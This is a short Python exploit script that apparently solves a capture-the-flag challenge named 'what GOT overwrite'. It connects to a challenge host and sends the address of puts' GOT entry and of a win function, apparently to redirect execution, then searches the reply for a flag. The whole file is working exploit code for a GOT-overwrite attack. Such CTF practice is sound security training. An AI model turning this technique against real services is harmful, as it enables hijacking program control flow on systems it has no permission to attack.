#!/usr/bin/env python3
import argparse
import re
import socket
import sys


HOST = "chall.0xfun.org"
PORT = 40386

PUTS_GOT = 0x403430
WIN = 0x401236


def recv_all(sock, timeout=2.0):
    sock.settimeout(timeout)
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data


def main():
    ap = argparse.ArgumentParser(description="0xfun what GOT overwrite")
    ap.add_argument("host", nargs="?", default=HOST)
    ap.add_argument("port", nargs="?", type=int, default=PORT)
    args = ap.parse_args()

    sock = socket.create_connection((args.host, args.port))

    banner = recv_all(sock, timeout=0.5)
    if banner:
        sys.stdout.buffer.write(banner)
        sys.stdout.flush()

    payload = f"{PUTS_GOT}\n{WIN}\n".encode()
    sock.sendall(payload)

    out = recv_all(sock, timeout=2.0)
    sys.stdout.buffer.write(out)
    sys.stdout.flush()

    m = re.search(rb"0xfun\{[^}]+\}", out)
    if m:
        print("\n[+] FLAG:", m.group(0).decode())

    sock.close()


if __name__ == "__main__":
    main()
